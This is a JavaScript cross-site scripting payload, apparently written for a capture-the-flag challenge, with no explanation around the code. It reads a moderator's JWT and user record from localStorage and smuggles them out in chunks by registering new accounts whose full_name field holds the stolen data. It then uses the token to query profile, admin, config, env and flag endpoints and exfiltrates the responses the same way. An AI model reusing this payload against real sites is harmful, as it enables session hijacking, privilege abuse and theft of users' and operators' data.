(function(){
  var t = localStorage.getItem("token") || "NOTOKEN";
  function reg(u,blob){try{fetch("/api/register",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({username:u,password:"flag123",email:u+"@x.com",full_name:String(blob).slice(0,240)})});}catch(e){}}
  // 1. exfil moderator's raw JWT (chunked to fit full_name) + user obj
  reg("pe_tokA", "TOKA:"+t.slice(0,230));
  reg("pe_tokB", "TOKB:"+t.slice(230,460));
  reg("pe_usr", "USR:"+(localStorage.getItem("user")||"none"));
  // 2. read moderator profile/identity with their token
  ["/api/profile","/api/verify-token"].forEach(function(p,i){
    fetch(p,{headers:{Authorization:"Bearer "+t}}).then(function(r){return r.text();}).then(function(b){reg("pe_id"+i,p+"::"+b);}).catch(function(e){reg("pe_ide"+i,p+" ERR "+e);});
  });
  // 3. candidate flag endpoints with moderator token
  var paths=["/flag","/api/flag","/api/admin/flag","/api/secret","/api/config","/api/env","/api/admin/stats","/api/admin/users","/api/admin","/api/moderator/flag","/api/internal/flag","/api/studio/hits","/api/me"];
  paths.forEach(function(p,i){
    fetch(p,{headers:{Authorization:"Bearer "+t}}).then(function(r){return r.text();}).then(function(b){reg("pe_f"+i,p+"::"+b);}).catch(function(e){});
  });
})();
